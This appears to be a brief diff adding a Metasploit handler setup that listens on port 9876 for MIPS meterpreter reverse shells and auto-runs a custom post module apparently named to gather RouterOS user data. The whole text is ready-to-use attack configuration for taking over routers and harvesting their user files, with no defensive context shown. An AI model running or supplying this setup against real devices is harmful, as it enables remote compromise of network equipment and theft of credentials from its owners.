@@ -1,0 +1,8 @@
+/root/.msf4/modules/post/linux/gather/routeros_userdat.rb
+
+use multi/handler
+set AutoRunScript post/linux/gather/routeros_userdat
+set ExitOnSession false
+set LHOST 0.0.0.0
+set LPORT 9876
+set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp
